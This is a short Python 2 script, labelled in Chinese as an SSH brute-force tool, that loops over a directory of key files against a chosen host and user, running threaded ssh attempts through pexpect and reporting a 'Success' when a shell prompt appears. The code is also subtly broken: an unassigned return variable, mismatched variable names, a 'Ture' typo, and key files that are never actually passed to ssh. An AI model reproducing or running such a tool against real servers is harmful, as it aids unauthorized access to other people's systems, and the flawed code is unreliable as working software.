# /usr/bin/env python
#coding::utf-8

__author__ = 'cmustard'

"""
ssh暴力破解
"""

import threading
import optparse
import pexpect
import os

fails = 0
stop=False
connect_lock=threading.BoundedSemaphore(value=5)

def connect(user,password,host,release):
    global stop
    global fails
    try:
        perm_denied = 'permission denied'
        ssh_key="Are you sure you want to continue"
        conn_closed = 'Connection closed by remote host'
        opt = "-o PasswordAuthentication=no"
        connstr = 'ssh %s@%s'%(user,host)
        child = pexpect.spawn(connstr)
        child.expect([pexpect.TIMEOUT,perm_denied,ssh_key,conn_closed,'$','#'])
        if ret == 2:
            print '[-] Adding Host to !/.ssh/known_hosts  '
            child.sendline('yes')
            connect(user,password,host,False)
        elif ret == 3:
            print "Connect closed by remote host"
            Fails+=1
        elif ret > 3:
            print '[+] Success    '+str(password)
            stop = Ture
    finally:
        if release:
            connect_lock.release()


def main( ):
    parser = optparse.OptionParser('Usage%prog -H <target host > -u <user> -d <directory>')
    parser.add_option('-H',dest = 'tghost',type="string",help="special target host")
    parser.add_option('-u',dest='tguser',type="string",help="special target host")
    parser.add_option('-d',dest='passdir',type="string",help="special directory with key")
    (options,args)=parser.parse_args()
    host=options.tghost
    user=options.tguser
    passdir=options.passdir

    if (host==None) | (user == None) | (passdir == None):
        print parser.usage
        exit(0)
    for filename in os.listdir(passdir):
        if stop:
            print "[*] Exiting :key Found"
            exit(0)
        if Fails > 5:
            print '[!!] Exiting :Too many Connection close by remote host'
            exit(0)
        connect_lock.acquire()
        fullpath = os.path.join(passdir,filename)
        print '[-] Testing keyfile '+str(fullpath)
        t = threading.Thread(target=connect,args=(user,fullpath,host,True))
        t.start()


if __name__=="__main__":
    main() 
